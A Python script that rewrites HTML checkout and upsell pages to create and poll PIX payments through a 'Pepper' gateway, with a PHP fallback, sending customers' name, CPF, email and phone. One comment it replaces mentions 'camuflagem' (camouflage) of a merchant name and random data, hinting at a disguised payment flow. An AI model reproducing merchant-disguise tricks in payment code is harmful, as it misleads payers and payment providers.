import os

def update_pagamento_file(filepath, pepper_script_rel, amount_str):
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()

    # 1. Add pepper-api.js script tag if not present
    script_tag = f'<script src="{pepper_script_rel}"></script>'
    if 'pepper-api.js' not in content:
        # insert right before the main <script> tag
        content = content.replace('<script>', f'{script_tag}\n  <script>', 1)

    # 2. Find the start marker
    start_marker = '// Integração Pepper Gateway com camuflagem Dramas Clube e dados aleatórios'
    end_marker = '});\n      }'

    start_idx = content.find(start_marker)
    if start_idx == -1:
        print(f"Start marker not found in {filepath}")
        return

    end_idx = content.find(end_marker, start_idx)
    if end_idx == -1:
        print(f"End marker not found in {filepath}")
        return

    replacement = f'''// Integração Pepper Gateway Direta (Client-Side JS sem PHP para GitHub Pages)
          var hasFinished = false;
          var fallbackTimer = setTimeout(function () {{
            if (!hasFinished) {{
              hasFinished = true;
              finishCheckout(null);
            }}
          }}, 12000);

          function handlePepperSuccess(json) {{
            if (!hasFinished) {{
              hasFinished = true;
              clearTimeout(fallbackTimer);
              if (json && json.pix) {{
                finishCheckout({{
                  pix_qr_code: json.pix.pix_qr_code,
                  qr_code_base64: json.pix.qr_code_base64,
                  hash: json.hash
                }});
              }} else {{
                finishCheckout(null);
              }}
            }}
          }}

          function handlePepperFallback() {{
            var apiEndpoint = "{pepper_script_rel}".replace("pepper-api.js", "../api/gerar-pix.php");
            try {{
              fetch(apiEndpoint, {{
                method: "POST",
                headers: {{ "Content-Type": "application/json", "Accept": "application/json" }},
                body: JSON.stringify({{
                  valor: "{amount_str}",
                  gateway_name: gatewayCustomer.name,
                  gateway_cpf: gatewayCustomer.cpf,
                  gateway_email: gatewayCustomer.email,
                  gateway_phone: gatewayCustomer.phone
                }})
              }})
              .then(function (res) {{
                if (res.ok) return res.json();
                throw new Error("HTTP " + res.status);
              }})
              .then(function (json) {{
                handlePepperSuccess(json);
              }})
              .catch(function () {{
                if (!hasFinished) {{
                  hasFinished = true;
                  clearTimeout(fallbackTimer);
                  finishCheckout(null);
                }}
              }});
            }} catch (err) {{
              if (!hasFinished) {{
                hasFinished = true;
                clearTimeout(fallbackTimer);
                finishCheckout(null);
              }}
            }}
          }}

          if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {{
            window.PepperAPI.createPix("{amount_str}", gatewayCustomer)
              .then(function (res) {{
                handlePepperSuccess(res);
              }})
              .catch(function (err) {{
                console.warn("Pepper direct failed, attempting fallback:", err);
                handlePepperFallback();
              }});
          }} else {{
            handlePepperFallback();
          }}
        '''

    new_content = content[:start_idx] + replacement + content[end_idx:]
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print(f"Successfully updated {filepath}")

def update_pix_gerado_file(filepath, pepper_script_rel):
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()

    # 1. Add pepper-api.js script tag if not present
    script_tag = f'<script src="{pepper_script_rel}"></script>'
    if 'pepper-api.js' not in content:
        content = content.replace('<script>', f'{script_tag}\n  <script>', 1)

    # 2. Update polling block
    start_marker = '// Verificação automática de status de pagamento (Polling com Pepper)'
    end_marker = '}, 3500);\n    }'

    start_idx = content.find(start_marker)
    if start_idx == -1:
        print(f"Start marker not found in {filepath}")
        return

    end_idx = content.find(end_marker, start_idx)
    if end_idx == -1:
        print(f"End marker not found in {filepath}")
        return
    end_idx += len(end_marker)

    replacement = f'''// Verificação automática de status de pagamento (Polling Pepper Client-side / PHP)
    var pixHash = params.get("pix_hash");
    if (!pixHash) {{
      try {{ pixHash = localStorage.getItem("pix_hash"); }} catch (e) {{}}
    }}

    if (pixHash) {{
      var pollInterval = setInterval(function () {{
        function handleSuccess() {{
          clearInterval(pollInterval);
          var statusBoxes = document.querySelectorAll(".bg-amber-500\\\\/10, [class*='bg-amber']");
          if (statusBoxes.length > 0) {{
            var sb = statusBoxes[0];
            sb.className = "flex flex-col items-center justify-center bg-emerald-500/10 font-bold w-full px-4 py-3.5 rounded-md border border-emerald-300 shadow-sm mt-2 text-emerald-800";
            sb.innerHTML = '<span style="display:inline-flex; align-items:center; gap:8px;">✅ Pagamento Confirmado com Sucesso! Redirecionando...</span>';
          }}
          setTimeout(function () {{
            window.avancarEtapa();
          }}, 1200);
        }}

        if (window.PepperAPI && typeof window.PepperAPI.consultPix === "function") {{
          window.PepperAPI.consultPix(pixHash)
            .then(function (data) {{
              if (data && (data.is_paid || data.payment_status === "paid")) {{
                handleSuccess();
              }}
            }})
            .catch(function () {{}});
        }} else {{
          var consultEndpoint = (function() {{
            var path = window.location.pathname;
            if (path.indexOf("/Upsells/") !== -1) {{
              return "../../../../api/consultar-pix.php?hash=" + encodeURIComponent(pixHash);
            }}
            return "../../api/consultar-pix.php?hash=" + encodeURIComponent(pixHash);
          }})();

          fetch(consultEndpoint)
            .then(function (res) {{ return res.ok ? res.json() : null; }})
            .then(function (data) {{
              if (data && (data.is_paid || data.payment_status === "paid")) {{
                handleSuccess();
              }}
            }})
            .catch(function () {{}});
        }}
      }}, 3500);
    }}'''

    new_content = content[:start_idx] + replacement + content[end_idx:]
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print(f"Successfully updated {filepath}")

def update_acesso_file(filepath, pepper_script_rel, amount_str):
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()

    # 1. Add pepper-api.js script tag if not present
    script_tag = f'<script src="{pepper_script_rel}"></script>'
    if 'pepper-api.js' not in content:
        content = content.replace('<script>', f'{script_tag}\n  <script>', 1)

    # 2. Update checkout API call block
    start_marker = 'var apiEndpoint = "../../api/gerar-pix.php";'
    end_marker = '}\n    }\n  </script>'

    start_idx = content.find(start_marker)
    if start_idx == -1:
        print(f"Start marker not found in {filepath}")
        return

    end_idx = content.find(end_marker, start_idx)
    if end_idx == -1:
        print(f"End marker not found in {filepath}")
        return

    replacement = f'''var finished = false;
      var timer = setTimeout(function () {{
        if (!finished) {{
          finished = true;
          goToPix(null);
        }}
      }}, 6000);

      function handleAcessoSuccess(json) {{
        if (!finished) {{
          finished = true;
          clearTimeout(timer);
          if (json && json.pix) {{
            goToPix({{
              pix_qr_code: json.pix.pix_qr_code,
              qr_code_base64: json.pix.qr_code_base64,
              hash: json.hash
            }});
          }} else {{
            goToPix(null);
          }}
        }}
      }}

      function handleAcessoFallback() {{
        var apiEndpoint = "../../api/gerar-pix.php";
        try {{
          fetch(apiEndpoint, {{
            method: "POST",
            headers: {{ "Content-Type": "application/json", "Accept": "application/json" }},
            body: JSON.stringify({{
              valor: "{amount_str}",
              gateway_name: gatewayCustomer.name,
              gateway_cpf: gatewayCustomer.cpf,
              gateway_email: gatewayCustomer.email,
              gateway_phone: gatewayCustomer.phone
            }})
          }})
          .then(function (res) {{
            if (res.ok) return res.json();
            throw new Error("HTTP " + res.status);
          }})
          .then(function (json) {{
            handleAcessoSuccess(json);
          }})
          .catch(function () {{
            if (!finished) {{
              finished = true;
              clearTimeout(timer);
              goToPix(null);
            }}
          }});
        }} catch (err) {{
          if (!finished) {{
            finished = true;
            clearTimeout(timer);
            goToPix(null);
          }}
        }}
      }}

      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {{
        window.PepperAPI.createPix("{amount_str}", gatewayCustomer)
          .then(function (res) {{
            handleAcessoSuccess(res);
          }})
          .catch(function (err) {{
            console.warn("Pepper direct failed, attempting fallback:", err);
            handleAcessoFallback();
          }});
      }} else {{
        handleAcessoFallback();
      }}
    '''

    new_content = content[:start_idx] + replacement + content[end_idx:]
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print(f"Successfully updated {filepath}")

# Execute updates
update_pagamento_file("checkout/Pagamento/index.html", "../pepper-api.js", "61.90")
update_pagamento_file("checkout/Upsells/01/Pagamento/index.html", "../../pepper-api.js", "35.82")
update_pagamento_file("checkout/Upsells/02/Pagamento/index.html", "../../pepper-api.js", "27.90")
update_pagamento_file("checkout/Upsells/03/Pagamento/index.html", "../../pepper-api.js", "19.70")
update_pagamento_file("checkout/Upsells/04/Pagamento/index.html", "../../pepper-api.js", "45.60")

update_pix_gerado_file("checkout/Pix-Gerado/index.html", "../pepper-api.js")
update_pix_gerado_file("checkout/Upsells/01/Pix-Gerado/index.html", "../../pepper-api.js")
update_pix_gerado_file("checkout/Upsells/02/Pix-Gerado/index.html", "../../pepper-api.js")
update_pix_gerado_file("checkout/Upsells/03/Pix-Gerado/index.html", "../../pepper-api.js")
update_pix_gerado_file("checkout/Upsells/04/Pix-Gerado/index.html", "../../pepper-api.js")

update_acesso_file("acesso/01/index.html", "../pepper-api.js", "35.82")
update_acesso_file("acesso/02/index.html", "../pepper-api.js", "27.90")
update_acesso_file("acesso/03/index.html", "../pepper-api.js", "19.70")
update_acesso_file("acesso/04/index.html", "../pepper-api.js", "45.60")
